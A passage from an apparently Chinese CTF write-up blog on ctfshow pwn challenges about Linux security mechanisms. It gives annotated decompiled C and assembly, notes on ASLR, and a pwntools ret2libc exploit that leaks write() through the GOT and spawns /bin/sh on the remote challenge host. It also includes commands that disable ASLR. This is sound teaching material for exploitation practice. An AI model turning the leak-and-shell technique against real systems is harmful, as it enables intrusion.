puts(asc_400B18); // 输出字符串asc_400B18  puts(asc_400BB0); // 输出字符串asc_400BB0  puts("    * *************************************                           ");  puts(aClassifyCtfsho); // 输出字符串aClassifyCtfsho  puts("    * Type  : Linux_Security_Mechanisms                               ");  puts("    * Site  : https://ctf.show/                                       ");  puts("    * Hint  : Please confirm your ASLR level first !                  ");  puts("    * *************************************                           ");  puts("Here is your ASLR level:");  system("cat /proc/sys/kernel/randomize_va_space"); // 执行系统命令，获取ASLR级别  puts("If the result is 0, then you get the correct flag!");  puts("If not,you will get a fake flag!");  printf("flag is :ctfshow{%p", main); // 输出当前main函数的地址  printf("_%p", system); // 输出system函数的地址  printf("_%p", ptr); // 输出申请的堆内存地址  printf("_%p", v5); // 输出动态加载的libc库地址  puts("}"); // 输出字符串"}"  free(ptr); // 释放之前申请的内存  return 0; // 返回0，表示程序执行成功}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（二）main函数汇编源代码"><a href="#（二）main函数汇编源代码" class="headerlink" title="（二）main函数汇编源代码"></a>（二）main函数汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">public mainmain proc nearptr= qword ptr -10h     ; 在栈帧中声明一个8字节变量ptr，用于存储malloc函数的返回值var_8= qword ptr -8     ; 在栈帧中声明一个8字节变量var_8，用于存储dlopen函数的返回值push    rbp             ; 将当前rbp寄存器的值压入栈中，保存现场mov     rbp, rsp        ; 将rsp寄存器的值复制到rbp寄存器，设置新的帧基址sub     rsp, 10h        ; 将rsp寄存器的值减去16，分配栈空间给局部变量ptr和var_8mov     edi, 4          ; 将4传递给malloc函数作为参数，即请求分配4字节的内存call    _malloc         ; 调用malloc函数mov     [rbp+ptr], rax  ; 将malloc返回的内存地址（在rax寄存器中）存入ptr变量mov     esi, 102h       ; 将258（十六进制表示为102h）传递给dlopen函数作为mode参数mov     edi, offset file ; 将"/lib/x86_64-linux-gnu/libc.so.6"字符串的地址传递给dlopen函数作为name参数call    _dlopen         ; 调用dlopen函数加载libc库mov     [rbp+var_8], rax ; 将dlopen返回的动态库句柄地址（在rax寄存器中）存入var_8变量; 以下部分代码多次调用_puts函数输出各种字符串，这些字符串的地址通过edi寄存器传递给_puts函数mov     edi, offset command ; "cat /proc/sys/kernel/randomize_va_space"call    _system         ; 调用_system函数执行系统命令，查看ASLR级别; 以下部分代码再次多次调用_puts函数输出各种字符串，这些字符串的地址通过edi寄存器传递给_puts函数mov     esi, offset main ; 获取main函数的地址，传递给_printf函数作为参数mov     edi, offset format ; "flag is :ctfshow{%p"mov     eax, 0call    _printf         ; 调用_printf函数输出字符串，其中包含main函数的地址mov     esi, offset _system ; 获取_system函数的地址，传递给_printf函数作为参数mov     edi, offset aP  ; "_%p"mov     eax, 0call    _printf         ; 调用_printf函数输出字符串，其中包含_system函数的地址mov     rax, [rbp+ptr]  ; 获取ptr变量中存储的堆内存地址，传递给_printf函数作为参数mov     rsi, raxmov     edi, offset aP  ; "_%p"mov     eax, 0call    _printf         ; 调用_printf函数输出字符串，其中包含堆内存地址mov     rax, [rbp+var_8] ; 获取var_8变量中存储的动态库句柄地址，传递给_printf函数作为参数mov     rsi, raxmov     edi, offset aP  ; "_%p"mov     eax, 0call    _printf         ; 调用_printf函数输出字符串，其中包含动态库句柄地址mov     edi, offset asc_400E51 ; "}"call    _puts           ; 调用_puts函数输出字符串"}"mov     rax, [rbp+ptr]  mov     rdi, rax        ; 获取ptr变量中存储的堆内存地址，传递给_free函数作为参数call    _free           ; 调用_free函数释放之前申请的堆内存mov     eax, 0          ; 设置函数返回值为0leave                   ; 恢复旧的rbp和rsp，清理栈帧retn                    ; 从main函数返回main endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（三）ASLR"><a href="#（三）ASLR" class="headerlink" title="（三）ASLR"></a>（三）ASLR</h3><p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加</p><p>软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的</p><p>位置，从而增加了利用软件漏洞进行攻击的难度。</p><p>开启不同等级会有不同的效果：</p><ol><li>内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的</li></ol><p>库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。</p><p>ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和</p><p>代码的位置。</p><ol start="2"><li>地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、</li></ol><p>堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位</p><p>置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</p><ol start="3"><li>随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着</li></ol><p>每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发</p><p>现这些偏移量，才能准确地定位和利用漏洞。</p><ol start="4"><li>堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起</li></ol><p>始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，</p><p>使得攻击者无法轻易地覆盖返回地址或控制程序流程。</p><p>在Linux中，ALSR的全局配置/proc/sys/kernel/randomize_va_space有三种情况：</p><p>0表示关闭ALSR</p><p>1表示部分开启（将mmap的基址、stack和vdso页面随机化）</p><p>2表示完全开启<strong>ALSR</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230725155733515.png" alt="image-20230725155733515"></p><h3 id="（四）malloc函数"><a href="#（四）malloc函数" class="headerlink" title="（四）malloc函数"></a>（四）malloc函数</h3><p>1.<code>malloc</code>是一个在C和C++语言中的库函数，用于动态内存分配。<code>malloc</code>函数的原型是<code>void* malloc(size_t size)</code>，这个函数会请求操作系统分配一块大小为<code>size</code>字节的内存，并返回这块内存的首地址。如果分配失败，它会返回一个<code>NULL</code>指针。</p><p>在你的程序中，<code>malloc(4uLL);</code>这行代码是请求操作系统分配4个字节的内存，并将返回的地址保存在变量<code>ptr</code>中。</p><p>2.动态内存分配是编程中的一个重要概念，特别是在C和C++这样的底层语言中。通过动态内存分配，程序可以在运行时根据需要申请任意大小的内存空间。这比静态分配的方式更灵活，可以更好地利用有限的内存资源。</p><p>在你的程序中，<code>malloc(4uLL);</code>这行代码的作用可能主要是为了获取一个堆内存的地址。然后这个地址在后面被用于生成一部分的标志位字符串。这就是这个<code>malloc</code>调用在你的程序中的具体用途。</p><p>更一般的情况是，动态内存分配（如<code>malloc</code>函数）常常用于以下几种情况：</p><ol><li>当你需要创建一个大小在编译时无法确定的数组时。比如，你要根据用户输入的值来创建一个数组，这时就需要动态内存分配。</li><li>当你需要创建一个生命周期超出其定义范围的对象时。比如，在一个函数中创建一个对象，并希望这个对象在函数返回后仍然存在。</li><li>当你需要创建一个大对象时，如大数组或大结构，通常会在堆上而不是栈上分配它们，以防止栈溢出。</li></ol><p>不过使用<strong>动态内存分配</strong>时需要注意，分配的内存在用完后应该由<strong>程序显式地释放</strong>，否则会造成<strong>内存泄漏</strong>。在你的程序中，这通过<code>free(ptr);</code>这行代码完成。</p><h3 id="（五）题解"><a href="#（五）题解" class="headerlink" title="（五）题解"></a>（五）题解</h3><h4 id="1-执行echo-0-gt-x2F-proc-x2F-sys-x2F-kernel-x2F-randomize-va-space"><a href="#1-执行echo-0-gt-x2F-proc-x2F-sys-x2F-kernel-x2F-randomize-va-space" class="headerlink" title="1.执行echo 0 > /proc/sys/kernel/randomize_va_space"></a>1.执行echo 0 &gt; /proc/sys/kernel/randomize_va_space</h4><h4 id="2-运行文件"><a href="#2-运行文件" class="headerlink" title="2.运行文件"></a>2.运行文件</h4><h2 id="十五、pwn027"><a href="#十五、pwn027" class="headerlink" title="十五、pwn027"></a>十五、pwn027</h2><h3 id="（一）main函数汇编源代码"><a href="#（一）main函数汇编源代码" class="headerlink" title="（一）main函数汇编源代码"></a>（一）main函数汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; int __cdecl main(int argc, const char **argv, const char **envp)public main  ; 定义main函数为公共函数，其他文件可引用main proc near  ; main函数开始ptr= qword ptr -10h  ; 在栈上声明一个变量ptr，从rbp向下偏移0x10的位置var_8= qword ptr -8  ; 在栈上声明一个变量var_8，从rbp向下偏移0x8的位置; __unwind {push    rbp  ; 保存旧的rbp值mov     rbp, rsp  ; 把当前栈顶地址（rsp）赋值给rbp，创建新的栈帧sub     rsp, 10h  ; 栈顶向下移动0x10个字节，为局部变量留出空间mov     edi, 4    ; 把4赋值给edi，此处即为malloc函数的参数，请求分配4字节的内存call    _malloc   ; 调用malloc函数，返回的指针存放在rax寄存器中mov     [rbp+ptr], rax  ; 把malloc返回的地址存储在ptr变量中mov     esi, 102h  ; 把0x102赋值给esi，此处即为dlopen函数的mode参数mov     edi, offset file ; "./libc-2.27.so"  ; 把"./libc-2.27.so"的地址赋值给edi，此处即为dlopen函数的filename参数call    _dlopen  ; 调用dlopen函数，返回的句柄存放在rax寄存器中mov     [rbp+var_8], rax  ; 把dlopen返回的句柄存储在var_8变量中... ; 之后的部分都是类似的结构，对于每个调用_puts、_printf、_system等函数的部分，它们分别把一些字符串输出到控制台或者执行一些命令mov     rax, [rbp+ptr]  ; 从ptr变量中获取之前malloc的内存地址mov     rdi, rax        ; 把地址赋值给rdi，此处即为free函数的参数call    _free  ; 调用free函数，释放之前分配的内存mov     eax, 0  ; 把0赋值给eax，作为main函数的返回值leave  ; 恢复rbp和rsp到调用前的值，即销毁当前栈帧retn  ; 从main函数返回; } // starts at 400687main endp  ; main函数结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（二）main函数C源代码"><a href="#（二）main函数C源代码" class="headerlink" title="（二）main函数C源代码"></a>（二）main函数C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  void *ptr; // [rsp+0h] [rbp-10h]  ptr = malloc(4uLL);  dlopen("./libc-2.27.so", 258);  puts(s);  puts(asc_4008D0);  puts(asc_400950);  puts(asc_4009E0);  puts(asc_400A70);  puts(asc_400AF8);  puts(asc_400B90);  puts("    * *************************************                           ");  puts(aClassifyCtfsho);  puts("    * Type  : Linux_Security_Mechanisms                               ");  puts("    * Site  : https://ctf.show/                                       ");  puts("    * Hint  : Please confirm your ASLR level first !                  ");  puts("    * *************************************                           ");  puts("Here is your ASLR level:");  system("cat /proc/sys/kernel/randomize_va_space");  puts("If the result is 0 or 1, then you get the correct flag!");  puts("If not,you will get a fake flag!");  printf("flag is :ctfshow{%p", main);  printf("_%p", system);  printf("_%p", ptr);  puts("}");  free(ptr);  return 0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十六、pwn28"><a href="#十六、pwn28" class="headerlink" title="十六、pwn28"></a>十六、pwn28</h2><h3 id="C源代码-2"><a href="#C源代码-2" class="headerlink" title="C源代码"></a>C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  void *ptr; // [rsp+0h] [rbp-10h]  ptr = malloc(4uLL);  dlopen("./libc-2.27.so", 258);  puts(s);  puts(asc_4008A0);  puts(asc_400920);  puts(asc_4009B0);  puts(asc_400A40);  puts(asc_400AC8);  puts(asc_400B60);  puts("    * *************************************                           ");  puts(aClassifyCtfsho);  puts("    * Type  : Linux_Security_Mechanisms                               ");  puts("    * Site  : https://ctf.show/                                       ");  puts("    * Hint  : Please confirm your ASLR level first !                  ");  puts("    * *************************************                           ");  puts("Here is your ASLR level:");  system("cat /proc/sys/kernel/randomize_va_space");  printf("flag is :ctfshow{%p", main);  printf("_%p", system);  puts("}");  free(ptr);  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="汇编源代码-1"><a href="#汇编源代码-1" class="headerlink" title="汇编源代码"></a>汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nearptr= qword ptr -10hvar_8= qword ptr -8; __unwind {push    rbpmov     rbp, rspsub     rsp, 10hmov     edi, 4          ; sizecall    _mallocmov     [rbp+ptr], raxmov     esi, 102h       ; modemov     edi, offset file ; "./libc-2.27.so"call    _dlopenmov     [rbp+var_8], raxmov     edi, offset s   ; "    "call    _putsmov     edi, offset asc_4008A0 ; "  "call    _putsmov     edi, offset asc_400920 ; " "call    _putsmov     edi, offset asc_4009B0 ; " "call    _putsmov     edi, offset asc_400A40 ; " "call    _putsmov     edi, offset asc_400AC8 ; "  "call    _putsmov     edi, offset asc_400B60 ; "    "call    _putsmov     edi, offset asc_400BE0 ; "    * *********************************"...call    _putsmov     edi, offset aClassifyCtfsho ; "    * Classify: CTFshow --- PWN --- "call    _putsmov     edi, offset aTypeLinuxSecur ; "    * Type  : Linux_Security_Mechanisms"...call    _putsmov     edi, offset aSiteHttpsCtfSh ; "    * Site  : https://ctf.show/        "...call    _putsmov     edi, offset aHintPleaseConf ; "    * Hint  : Please confirm your ASLR "...call    _putsmov     edi, offset asc_400BE0 ; "    * *********************************"...call    _putsmov     edi, offset aHereIsYourAslr ; "Here is your ASLR level:"call    _putsmov     edi, offset command ; "cat /proc/sys/kernel/randomize_va_space"call    _systemmov     esi, offset mainmov     edi, offset format ; "flag is :ctfshow{%p"mov     eax, 0call    _printfmov     esi, offset _systemmov     edi, offset aP  ; "_%p"mov     eax, 0call    _printfmov     edi, offset asc_400DA8 ; "}"call    _putsmov     rax, [rbp+ptr]mov     rdi, rax        ; ptrcall    _freemov     eax, 0leaveretn; } // starts at 400687main endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十七、pwn29"><a href="#十七、pwn29" class="headerlink" title="十七、pwn29"></a>十七、pwn29</h2><h3 id="（一）C源代码"><a href="#（一）C源代码" class="headerlink" title="（一）C源代码"></a>（一）C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  char v4[4]; // [rsp+4h] [rbp-1Ch] BYREF  void *ptr; // [rsp+8h] [rbp-18h]  void *v6; // [rsp+10h] [rbp-10h]  unsigned __int64 v7; // [rsp+18h] [rbp-8h]  v7 = __readfsqword(0x28u);  ptr = malloc(4uLL);  v6 = dlopen("./libc-2.27.so", 258);  puts(s);  puts(asc_B10);  puts(asc_B90);  puts(asc_C20);  puts(asc_CB0);  puts(asc_D38);  puts(asc_DD0);  puts("    * *************************************                           ");  puts(aClassifyCtfsho);  puts("    * Type  : Linux_Security_Mechanisms                               ");  puts("    * Site  : https://ctf.show/                                       ");  puts("    * Hint  : Please confirm your ASLR level first !                  ");  puts("    * *************************************                           ");  system("echo 2 &gt; /proc/sys/kernel/randomize_va_space");  puts("Here is your ASLR level:");  system("cat /proc/sys/kernel/randomize_va_space");  puts("Let's take a look at protection:");  system("checksec pwn");  printf("executable: %p\n", main);  printf("system@plt: %p\n", &amp;system);  printf("heap: %p\n", ptr);  printf("stack: %p\n", v4);  puts("As you can see, the protection has been fully turned on and the address has been completely randomized!");  puts("Here is your flag:");  puts("ctfshow{Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!}");  free(ptr);  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（二）汇编源代码"><a href="#（二）汇编源代码" class="headerlink" title="（二）汇编源代码"></a>（二）汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nearvar_1C= byte ptr -1Chptr= qword ptr -18hvar_10= qword ptr -10hvar_8= qword ptr -8; __unwind {push    rbpmov     rbp, rspsub     rsp, 20hmov     rax, fs:28hmov     [rbp+var_8], raxxor     eax, eaxmov     edi, 4          ; sizecall    _mallocmov     [rbp+ptr], raxmov     esi, 102h       ; modelea     rdi, file       ; "./libc-2.27.so"call    _dlopenmov     [rbp+var_10], raxlea     rdi, s          ; "    "call    _putslea     rdi, asc_B10    ; "  "call    _putslea     rdi, asc_B90    ; " "call    _putslea     rdi, asc_C20    ; " "call    _putslea     rdi, asc_CB0    ; " "call    _putslea     rdi, asc_D38    ; "  "call    _putslea     rdi, asc_DD0    ; "    "call    _putslea     rdi, asc_E50    ; "    * *********************************"...call    _putslea     rdi, aClassifyCtfsho ; "    * Classify: CTFshow --- PWN --- "call    _putslea     rdi, aTypeLinuxSecur ; "    * Type  : Linux_Security_Mechanisms"...call    _putslea     rdi, aSiteHttpsCtfSh ; "    * Site  : https://ctf.show/        "...call    _putslea     rdi, aHintPleaseConf ; "    * Hint  : Please confirm your ASLR "...call    _putslea     rdi, asc_E50    ; "    * *********************************"...call    _putslea     rdi, command    ; "echo 2 &gt; /proc/sys/kernel/randomize_va_"...call    systemlea     rdi, aHereIsYourAslr ; "Here is your ASLR level:"call    _putslea     rdi, aCatProcSysKern ; "cat /proc/sys/kernel/randomize_va_space"call    systemlea     rdi, aLetSTakeALookA ; "Let's take a look at protection:"call    _putslea     rdi, aChecksecPwn ; "checksec pwn"call    systemlea     rsi, mainlea     rdi, format     ; "executable: %p\n"mov     eax, 0call    _printfmov     rax, cs:system_ptrmov     rsi, raxlea     rdi, aSystemPltP ; "system@plt: %p\n"mov     eax, 0call    _printfmov     rax, [rbp+ptr]mov     rsi, raxlea     rdi, aHeapP     ; "heap: %p\n"mov     eax, 0call    _printflea     rax, [rbp+var_1C]mov     rsi, raxlea     rdi, aStackP    ; "stack: %p\n"mov     eax, 0call    _printflea     rdi, aAsYouCanSeeThe ; "As you can see, the protection has been"...call    _putslea     rdi, aHereIsYourFlag ; "Here is your flag:"call    _putslea     rdi, aCtfshowAddress ; "ctfshow{Address_Space_Layout_Randomizat"...call    _putsmov     rax, [rbp+ptr]mov     rdi, rax        ; ptrcall    _freemov     eax, 0mov     rdx, [rbp+var_8]xor     rdx, fs:28hjz      short locret_9F8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230725162402607.png" alt="image-20230725162402607"></p><h3 id="（三）ctfshowC源代码"><a href="#（三）ctfshowC源代码" class="headerlink" title="（三）ctfshowC源代码"></a>（三）ctfshowC源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t ctfshow(){  char buf[132]; // [esp+0h] [ebp-88h] BYREF  return read(0, buf, 0x100u);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *  # 导入pwntools库，这是一个CTF pwn（二进制漏洞利用）的工具库context.log_level = 'debug'  # 设置日志级别为debug，这样程序会打印出更多的调试信息# io = process('./pwn')  # 创建一个新的进程来运行本地的'./pwn'程序，这行被注释掉了# libc = ELF('/lib/i386-linux-gnu/libc.so.6')  # 加载本地的libc库，这行被注释掉了io = remote('pwn.challenge.ctf.show', 28145)  # 创建一个到远程服务器的连接elf = ELF('./pwn')  # 加载'./pwn'程序，获取它的信息libc = ELF('/home/ctfshow/libc/32bit/libc-2.27.so')  # 加载远程服务器上的libc库，获取它的信息ctfshow = elf.sym['ctfshow']  # 获取'ctfshow'这个函数在程序中的地址# 构造payload，包含140个"A"，然后是write函数的地址，ctfshow函数的地址，参数1，write函数的got表地址，参数4payload = "A" * 140 + p32(elf.sym['write']) + p32(ctfshow) + p32(1) + p32(elf.got['write']) + p32(4)io.send(payload)  # 发送payload到远程服务器write_addr = u32(io.recv(4))  # 从远程服务器接收4个字节，这是write函数的实际地址# 计算system函数和/bin/sh字符串在远程服务器上的实际地址system_addr = write_addr - libc.sym['write'] + libc.sym['system']binsh_addr = write_addr - libc.sym['write'] + next(libc.search('/bin/sh'))# 构造第二个payload，包含140个"B"，然后是system函数的地址，ctfshow函数的地址，/bin/sh字符串的地址payload2 = "B" * 140 + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)io.send(payload2)  # 发送第二个payload到远程服务器io.interactive()  # 进入交互模式，这样我们就可以手动输入命令到远程服务器上执行了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-计算函数的实际地址"><a href="#1-计算函数的实际地址" class="headerlink" title="1.计算函数的实际地址"></a>1.计算函数的实际地址</h4><p>首先通过泄露write函数的实际地址（write_addr），然后利用这个信息和库文件中的信息来计算其他函数和数据的实际地址。</p><p>具体来说，<code>libc.sym['write']</code>是write函数在libc库文件中的偏移量，<code>libc.sym['system']</code>是system函数在libc库文件中的偏移量，<code>next(libc.search('/bin/sh'))</code>是”/bin/sh”字符串在libc库文件中的偏移量。</p><p>所以，<code>write_addr - libc.sym['write']</code>就是libc库在内存中的基地址（因为write函数的实际地址减去它在libc库中的偏移量就等于libc库的基地址）。然后再加上其他函数或数据在libc库中的偏移量，就可以得到这些函数或数据的实际地址。</p><p>例如，<code>write_addr - libc.sym['write'] + libc.sym['system']</code>就是计算system函数的实际地址，<code>write_addr - libc.sym['write'] + next(libc.search('/bin/sh'))</code>就是计算”/bin/sh”字符串的实际地址。</p><h4 id="2-write函数泄露"><a href="#2-write函数泄露" class="headerlink" title="2.write函数泄露"></a>2.write函数泄露</h4><p>虽然<code>ctfshow()</code>函数使用了<code>read()</code>函数来从标准输入读取数据到缓冲区，但是这并不意味着我们可以通过<code>read()</code>函数来泄露地址。这是因为<code>read()</code>函数的功能是从文件描述符读取数据，而不是输出数据。在这个上下文中，文件描述符0代表标准输入。</p><p>另一方面，<code>write()</code>函数的功能是将数据写入到文件描述符。在这个上下文中，文件描述符1代表标准输出。因此，我们可以通过调用<code>write()</code>函数，将内存中的数据（例如函数的地址）写入到标准输出，从而泄露这些数据。</p><p>在这个脚本中，我们首先构造一个payload，使得程序调用<code>write()</code>函数，将<code>write()</code>函数自己在GOT表中的地址写入到标准输出。然后我们从标准输出读取这个地址，就可以得到<code>write()</code>函数的实际地址。这就是为什么我们要通过<code>write()</code>函数来泄露地址。</p><p>至于为什么要泄露<code>write()</code>函数的地址，而不是其他函数的地址，这主要是因为<code>write()</code>函数的地址在GOT表中，而GOT表是在程序的数据段，不受ASLR的影响，所以它的地址是固定的。另外，<code>write()</code>函数在libc库中，所以通过泄露<code>write()</code>函数的地址，我们就可以计算出libc库的基地址，进而计算出其他函数和数据的实际地址。</p><h2 id="十八、pwn031"><a href="#十八、pwn031" class="headerlink" title="十八、pwn031"></a>十八、pwn031</h2><h3 id="（一）汇编源代码"><a href="#（一）汇编源代码" class="headerlink" title="（一）汇编源代码"></a>（一）汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame fuzzy-sp; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nearargc= dword ptr  8argv= dword ptr  0Chenvp= dword ptr  10h; __unwind {lea     ecx, [esp+4]and     esp, 0FFFFFFF0hpush    dword ptr [ecx-4]push    ebpmov     ebp, esppush    ebxpush    ecxcall    __x86_get_pc_thunk_bxadd     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)mov     eax, ds:(stdin_ptr - 1FC0h)[ebx]mov     eax, [eax]push    0               ; npush    1               ; modespush    0               ; bufpush    eax             ; streamcall    _setvbufadd     esp, 10hmov     eax, ds:(stdout_ptr - 1FC0h)[ebx]mov     eax, [eax]push    0               ; npush    2               ; modespush    0               ; bufpush    eax             ; streamcall    _setvbufadd     esp, 10hsub     esp, 8lea     eax, (main - 1FC0h)[ebx]push    eaxlea     eax, (unk_850 - 1FC0h)[ebx]push    eax             ; formatcall    _printfadd     esp, 10hcall    ctfshowsub     esp, 0Chlea     eax, (unk_854 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_8C8 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_944 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_9D0 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_A60 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_AE4 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_B78 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (asc_BF4 - 1FC0h)[ebx] ; "    * *********************************"...push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_C3C - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (aTypeLinuxSecur - 1FC0h)[ebx] ; "    * Type  : Linux_Security_Mechanisms"...push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (aSiteHttpsCtfSh - 1FC0h)[ebx] ; "    * Site  : https://ctf.show/        "...push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (aHintBypassAlsr - 1FC0h)[ebx] ; "    * Hint  : Bypass ALSR &amp; PIE "push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (asc_BF4 - 1FC0h)[ebx] ; "    * *********************************"...push    eax             ; scall    _putsadd     esp, 10hsub     esp, 4push    0Eh             ; nlea     eax, (aHelloCtfshow - 1FC0h)[ebx] ; "Hello CTFshow!\n"push    eax             ; bufpush    0               ; fdcall    _writeadd     esp, 10hmov     eax, 0lea     esp, [ebp-8]pop     ecxpop     ebxpop     ebplea     esp, [ecx-4]retn; } // starts at 652main endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><sp